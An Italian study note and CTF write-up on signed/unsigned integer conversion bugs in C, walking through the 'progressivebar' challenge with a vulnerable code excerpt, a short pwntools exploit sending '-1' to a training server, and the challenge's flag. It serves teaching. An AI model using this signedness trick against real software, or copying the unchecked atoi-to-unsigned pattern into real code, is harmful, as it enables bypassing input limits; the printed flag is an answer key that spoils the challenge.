---
title: Signed e Unsigned (Integer Overflow)
tags:
  - cyberbootcamp
  - concetto
  - binary-exploitation
  - integer-overflow
---

# Signed e Unsigned (Integer Overflow)

> [!summary] In breve
> Un controllo può proteggere l'input dal lato sbagliato: limita la **lunghezza del testo** ma non il **valore**. Se un numero **con segno** (`int`, quello che ritorna `atoi`) finisce in una variabile **senza segno** (`unsigned int`), un valore negativo come `-1` diventa enorme: `0xFFFFFFFF` = 4.294.967.295. Il controllo passa, il programma usa quel numero gigante, e salta la logica prevista.

```
atoi("-1")  ->  -1   (int, con segno)
(unsigned int)(-1)  ->  0xFFFFFFFF = 4.294.967.295
```

In Python lo verifichi con `-1 & 0xFFFFFFFF`.

## Perché succede

In C i tipi interi hanno dimensione fissa e il linguaggio converte implicitamente tra `signed` e `unsigned`. Un `int` e un `unsigned int` sono **gli stessi 32 bit**, interpretati in due modi:

| Pattern di bit | come `int` | come `unsigned int` |
|---|---|---|
| `0xFFFFFFFF` | `-1` | `4294967295` |
| `0x80000000` | `-2147483648` | `2147483648` |

Il bug nasce quando un controllo e l'uso successivo **guardano cose diverse**: nel caso di progressivebar il controllo guarda quante cifre hai scritto (`strlen`), l'uso guarda il valore dopo la conversione a `unsigned`.

> [!tip] Come riconoscerlo
> Cerca un valore che arriva dall'esterno, passa per `atoi`/`atol` o un cast, viene messo in una variabile `unsigned` (o passato a `memcpy`/`malloc`/un contatore di loop), **ma** il controllo prima è su `strlen` o su un `int` con segno. Un `-1` corto di due caratteri è spesso la chiave.

Il taglio completo di questa famiglia (integer overflow vero da `a+b`, truncation, signedness remoto pre-auth, casi reali di Hacking Exposed 7) è nella nota di Ethical Hacking [[Integer Overflow & Signedness Attacks]].

## Challenge

### progressivebar · signed/unsigned per saltare il limite di iterazioni

File: `exercices/pwn/progressivebar/vuln.c`, `pr0gr3ss1v3_b4r_public` e `progressive_exploit.py`.

Il programma chiede un numero di iterazioni e disegna una progress bar che, tacca dopo tacca, stampa i caratteri della flag:

```c
unsigned int number_iteration;                 // <-- unsigned
...
fgets(str_number_iteration, 11, stdin);        // max 10 char + \0 in un buffer da 11: niente overflow
if (strlen(str_number_iteration) > 9) exit(1); // guarda la LUNGHEZZA del testo, non il valore
number_iteration = atoi(str_number_iteration); // atoi ritorna int CON SEGNO
while (number_iteration > counter) {
    if (counter % (0xFFFFFFFF / (flag_redacted + '\n')) == 0) {
        // ogni "passo" giri stampa un carattere della flag e avanza v5
    }
    ++counter;
}
```

Il **passo** è `0xFFFFFFFF / (len_flag + 10)` ≈ 69 milioni: ogni ~69 milioni di giri di `counter` stampa un carattere. Per arrivare all'ultima lettera servono `passo × (5 + len_flag)` ≈ **3,95 miliardi** di iterazioni. Ma il controllo `strlen > 9` ti lascia al massimo 9 cifre, cioè `999.999.999` ≈ 1 miliardo: troppo poco, leggi solo i primi ~10 caratteri.

La via d'uscita è il signed/unsigned: `"-1"` è lungo due caratteri (passa il controllo), `atoi` lo legge come `-1`, e messo in `number_iteration` (unsigned) diventa `0xFFFFFFFF` = **4.294.967.295**, più dei 3,95 miliardi che servono. La barra arriva in fondo e stampa tutta la flag.

```python
from pwn import *

p = remote("cyberchallenge.diag.uniroma1.it", PORT)   # oppure process(binario)
p.recvuntil(b"Enter the number of iterations: ")
p.sendline(b"-1")                                      # -1 -> 0xFFFFFFFF iterazioni
print(p.recvall())                                     # ...ccit{...}
```

Flag: `ccit{pr0Gr3ss1v3_b4r_1s_fUn_bu7_0v3rfl0w_1s_fuNn13r}`. (4 miliardi di giri ci mettono qualche secondo: è normale.)

> [!warning] Depistaggi su cui non perdere tempo
> - **Il canary non c'entra.** `checksec` mostra tutte le mitigazioni attive (Canary, NX, PIE, Full RELRO, SHSTK, IBT), ma `fgets(buf, 11, stdin)` legge al massimo 10 byte + `\0` in un buffer da 11: **non c'è overflow**, e il controllo del canary in fondo è solo l'epilogo standard della funzione. Niente da sovrascrivere.
> - **Non è una format string.** Tutte le `printf` hanno formati fissi; l'utente non controlla la stringa di formato. La categoria giusta è **integer overflow (signedness bug)**: il bug è nel valore che entra in `number_iteration`, non in memoria.

## Collegamenti

- **Approfondimento (Ethical Hacking)**: [[Integer Overflow & Signedness Attacks]] · [[Buffer Overflow]]
- **Strumenti**: [[pwntools]]
- **Mappa**: [[MOC - CyberBootCamp]]
